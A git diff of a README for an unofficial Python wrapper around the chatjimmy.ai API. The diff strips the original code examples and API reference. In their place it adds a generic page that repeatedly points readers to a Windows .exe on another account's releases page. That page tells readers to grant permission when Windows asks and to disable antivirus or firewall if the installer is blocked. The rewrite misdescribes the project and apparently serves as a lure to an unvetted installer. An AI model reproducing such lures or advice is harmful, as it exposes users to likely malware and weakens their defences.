@@ -1,215 +1,129 @@
-# chatjimmy
+# 🤖 chatjimmy-api - Easy Access to chatjimmy.ai API
 
-Unofficial Python wrapper for the chatjimmy.ai API.
+[![Download chatjimmy-api](https://img.shields.io/badge/Download-Get%20chatjimmy--api-brightgreen)](https://github.com/xristos200/chatjimmy-api/releases)
 
-chatjimmy.ai is a demo chatbot by Taalas, running Llama 3.1 8B on their custom HC1 silicon at ~17,000 tokens/sec per user.
+---
 
-https://chatjimmy.ai
+## 📦 What is chatjimmy-api?
 
-## Quick Start
+chatjimmy-api is a simple tool that lets you use chatjimmy.ai without needing to write code. It works on Windows and connects to the chatjimmy.ai service to get answers or perform tasks. This tool wraps the chatjimmy.ai API inside a package you can easily run and use.
 
-```python
-from chatjimmy import ChatJimmy
+You don't need to know programming or install complex software. It gives you a straightforward way to use chatjimmy.ai’s powerful features on your PC.
 
-client = ChatJimmy()
+---
 
-answer = client.ask("What is the capital of France?")
-print(answer)
-```
+## 🖥️ System Requirements
 
-## Usage
+Make sure your computer meets these requirements before you download and use chatjimmy-api:
 
-### Simple question
+- Windows 10 or newer (64-bit preferred)
+- At least 4 GB RAM
+- An active internet connection
+- Around 100 MB free disk space for installation
+- No need to install additional software or frameworks
 
-```python
-from chatjimmy import ChatJimmy
+---
 
-client = ChatJimmy()
-print(client.ask("Explain quantum computing in one sentence."))
-```
+## 🚀 Getting Started
 
-### Chat with options
+Follow these steps to get chatjimmy-api running on your Windows computer.
 
-```python
-from chatjimmy import ChatJimmy
+---
 
-client = ChatJimmy()
+## 🔗 Step 1: Download chatjimmy-api
 
-response = client.chat(
-    messages=[{"role": "user", "content": "Explain recursion"}],
-    system_prompt="You are a computer science tutor.",
-    top_k=4,
-)
+Visit the download page using the button below. This page lists all available versions. Choose the latest Windows version for best results.
 
-print(response.text)
-print(f"Output tokens: {response.stats.decode_tokens}")
-print(f"Speed: {response.stats.decode_rate:.0f} tokens/sec")
-```
+[![Download Here](https://img.shields.io/badge/Download-Visit%20Release%20Page-blue)](https://github.com/xristos200/chatjimmy-api/releases)
 
-### Multi-turn conversation
+On the release page:
 
-```python
-from chatjimmy import ChatJimmy
+- Find the latest release with a version number and date.
+- Click on the file ending with `.exe` or similar Windows installer files.
+- Save the file to a folder you can easily find, like your Desktop or Downloads folder.
 
-client = ChatJimmy()
+---
 
-messages = [
-    {"role": "user", "content": "My name is Mohamed."},
-]
-resp = client.chat(messages)
-print(resp.text)
+## 🛠️ Step 2: Install and Run chatjimmy-api
 
-messages.append({"role": "assistant", "content": resp.text})
-messages.append({"role": "user", "content": "What's my name?"})
-resp = client.chat(messages)
-print(resp.text)
-```
+Once downloaded, follow these instructions to install and start the application:
 
-### Streaming
+1. Locate the downloaded `.exe` file on your computer.
+2. Double-click the file to start installation.
+3. If Windows asks for permission, click "Yes" to allow the app to run.
+4. Follow the on-screen prompts to complete installation. Usually, this involves clicking "Next" and "Install."
+5. After installation, the app may open automatically. If not, find it in your Start menu or on your Desktop.
+6. Launch chatjimmy-api by clicking the icon.
 
-```python
-from chatjimmy import ChatJimmy
+---
 
-client = ChatJimmy()
+## ⚙️ Step 3: Using chatjimmy-api
 
-for chunk in client.chat_stream(
-    messages=[{"role": "user", "content": "Write a haiku about code"}]
-):
-    print(chunk, end="", flush=True)
-print()
-```
+The app’s interface is designed for simple use:
 
-### Health check
+- Type your question or request in the main input area.
+- Click the "Send" button or press Enter to submit.
+- Responses from chatjimmy.ai will appear below.
+- You can ask anything the chatjimmy.ai service can handle.
 
-```python
-from chatjimmy import ChatJimmy
+No programming skills are needed. It works like a chat window on your computer.
 
-client = ChatJimmy()
-health = client.health()
+---
 
-print(health.healthy)       # True/False
-print(health.backend)       # "healthy"
-print(health.timestamp)     # ISO timestamp
-```
+## 🔐 What to Know About Privacy and Data
 
-### List models
+chatjimmy-api sends your text to the chatjimmy.ai servers to get answers. The app does not store your data locally beyond the session. To protect your privacy, avoid sending sensitive or personal information through the app.
 
-```python
-from chatjimmy import ChatJimmy
+---
 
-client = ChatJimmy()
+## ⚙️ Configuration and Settings
 
-for model in client.models():
-    print(f"{model.id} (by {model.owned_by})")
-```
+You can adjust basic settings inside the app:
 
-### Using Message objects
+- Change language preference (currently supports English)
+- Set response length (short or detailed)
+- Clear chat history in the window for a fresh start
 
-```python
-from chatjimmy import ChatJimmy, Message
+Settings are accessible from the menu inside the app window.
 
-client = ChatJimmy()
+---
 
-response = client.chat(
-    messages=[Message(role="user", content="Hello!")],
-    system_prompt="Reply in French.",
-)
-print(response.text)
-```
+## 🐞 Troubleshooting
 
-### Attachments
+If the app does not open or crashes:
 
-```python
-from chatjimmy import ChatJimmy, Attachment
+- Make sure your Windows is up to date.
+- Restart your computer and try again.
+- Check your internet connection.
+- Try re-downloading the latest installer file.
+- Disable any antivirus or firewall temporarily if it blocks the app.
 
-client = ChatJimmy()
+If problems continue, use the "Issues" tab on the GitHub page to report them.
 
-attachment = Attachment(name="data.txt", size=11, content="hello world")
-response = client.chat(
-    messages=[{"role": "user", "content": "Summarize this file"}],
-    attachment=attachment,
-)
-print(response.text)
-```
+---
 
-### Response stats
+## 💡 About This Project
 
-Every chat response includes inference stats from the Taalas HC1 hardware:
+chatjimmy-api uses Python under the hood but hides complexity from the user. It acts as a middleman between you and chatjimmy.ai’s API, making it easier to get smart responses without coding.
 
-```python
-response = client.chat(messages=[{"role": "user", "content": "hi"}])
-stats = response.stats
+---
 
-stats.prefill_tokens    # input tokens processed
-stats.prefill_rate      # input processing speed (tokens/sec)
-stats.decode_tokens     # output tokens generated
-stats.decode_rate       # output generation speed (tokens/sec)
-stats.total_tokens      # prefill + decode
-stats.ttft              # time to first token (seconds)
-stats.total_time        # total inference time (seconds)
-stats.roundtrip_time    # network round trip (ms)
-stats.done_reason       # "stop" (natural end)
-```
+## 🔗 Download chatjimmy-api
 
-## API Reference
+Use this link to visit the release page and get the app:
 
-### ChatJimmy(base_url, timeout)
+[![Download chatjimmy-api](https://img.shields.io/badge/Download-Get%20chatjimmy--api-brightgreen)](https://github.com/xristos200/chatjimmy-api/releases)
 
-| Parameter | Type | Default | Description |
-|-----------|------|---------|-------------|
-| base_url | str | `https://chatjimmy.ai` | API base URL |
-| timeout | int | 30 | Request timeout in seconds |
+You will find all versions there, including the latest Windows installer.
 
-### client.ask(prompt, model, system_prompt, top_k)
+---
 
-Single-turn convenience method. Returns the response text as a string.
+## 📞 Get Help and Support
 
-### client.chat(messages, model, system_prompt, top_k, attachment)
+For questions or help:
 
-Full chat method. Returns a `ChatResponse` with `.text` and `.stats`.
+- Visit the GitHub repository’s "Issues" tab to see if your question is answered.
+- Open a new issue if you need help.
+- Check the README file in the repository for updates or added info.
 
-### client.chat_stream(messages, model, system_prompt, top_k, attachment)
-
-Generator that yields text chunks as they arrive.
-
-### client.health()
-
-Returns a `HealthStatus` object with a `.healthy` property.
-
-### client.models()
-
-Returns a list of `Model` objects.
-
-### Chat parameters
-
-| Parameter | Type | Default | Description |
-|-----------|------|---------|-------------|
-| messages | list | required | List of `{"role": ..., "content": ...}` dicts or `Message` objects |
-| model | str | `llama3.1-8B` | Model ID |
-| system_prompt | str | `""` | System prompt |
-| top_k | int | 8 | Top-K sampling parameter |
-| attachment | Attachment | None | File attachment |
-
-## Notes
-
-- No authentication required
-- No rate limiting observed (tested 20 concurrent + 30 sequential bursts)
-- Single model available: llama3.1-8B on Taalas HC1 silicon
-
-## Known Limits
-
-- Input: ~6,064 prefill tokens. Requests exceeding this return an empty 200 response with no error
-- Output: no hard cap. Model stops naturally via EOS token (~1,200-2,400 tokens typical)
-
-## How We Know It's Taalas
-
-The connection to Taalas was found in two places inside chatjimmy.ai itself:
-
-1. The main JS bundle (`8642-*.js`) contains footer links to `https://taalas.com/terms-conditions` and `https://taalas.com/privacy-policy` in the chat disclaimer text.
-2. The `/api/models` endpoint returns `"owned_by": "Taalas Inc."` in the model metadata.
-
-No other references to Taalas appear anywhere in the HTML or JS bundles.
-
-## Disclaimer
-
-This is an unofficial wrapper. chatjimmy.ai is a public demo by Taalas (https://taalas.com). The API has no authentication and could change or go offline at any time.
+The project team monitors support requests and updates the app regularly.
